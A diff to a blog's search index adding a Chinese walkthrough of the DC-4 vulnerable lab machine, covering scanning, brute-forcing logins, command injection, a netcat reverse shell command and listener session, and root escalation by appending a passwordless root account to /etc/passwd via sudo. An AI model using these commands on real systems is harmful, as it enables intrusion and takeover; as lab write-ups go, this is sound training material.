@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>DC-4靶机渗透测试报告</title>
+      <link href="2021/10/10/DC-4%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/"/>
+      <url>2021/10/10/DC-4%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>咕了好久差点忘了~</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>内网扫描一波找到目标，并通过nmap扫描其端口发现开着22、80端口</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/dc4001.png"></p><p>访问目标发现是一个登录框并提示admin登录</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/dc4002.png"></p><h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>利用burp的爆破模块得到账号密码为 <code>admin/happy</code>（但是我没爆破出来.jpg</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/dc4003.png"></p><p>发现可以执行命令，于是尝试抓包改参数执行命令</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/dc4004.png"></p><p>接着我们就可以构造payload通过nc反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.233.128 4444 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/dc4005.png"></p><p>进去后查看home目录下有三个用户：charles、jim、sam，其中只有jim用户存在可用信息并找到了一个密码本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc -lvvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">192.168.233.134: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.233.128] from (UNKNOWN) [192.168.233.134] 35700</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">ls</span><br><span class="line">command.php</span><br><span class="line">css</span><br><span class="line">images</span><br><span class="line">index.php</span><br><span class="line">login.php</span><br><span class="line">logout.php</span><br><span class="line">cd &#x2F;home</span><br><span class="line">ls</span><br><span class="line">charles</span><br><span class="line">jim</span><br><span class="line">sam</span><br><span class="line">ls charles&#x2F;</span><br><span class="line">ls sam&#x2F;</span><br><span class="line">ls jim&#x2F;</span><br><span class="line">backups</span><br><span class="line">mbox</span><br><span class="line">test.sh</span><br><span class="line">ls backups&#x2F;</span><br><span class="line">old-passwords.bak</span><br><span class="line">cat backups&#x2F;old-passwords.bak</span><br><span class="line">000000</span><br><span class="line">12345</span><br><span class="line">iloveyou</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>接着我们就利用该密码本成功爆破出该ssh账号密码为 <code>jim/jibril04</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/dc4006.png"></p><p>然后我们就可以ssh连上查看jim目录下的mbox，发现是root发的邮件</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/dc4007.png"></p><p>于是我们前往 <code>/var/mail</code> 查看邮件，进而发现 charles 的密码 <code>^xHhA&amp;hvim0y</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/dc4008.png"></p><p>然后我们切换到 charles 用户，使用 <code>sudo -l</code> 发现 teehee 用户不用输入密码便可以有root权限</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/dc4009.png"></p><p>于是我们可以利用 teehee 提权，通过 teehee 用户添加一个admin用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::&#x2F;bin&#x2F;bash&quot; | sudo teehee -a &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>最后切换到admin用户即可获取root权限，进而得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/dc4010.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> DC </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>BadUSB配合CS免杀实现上线</title>
       <link href="2021/10/09/badusb/"/>
       <url>2021/10/09/badusb/</url>
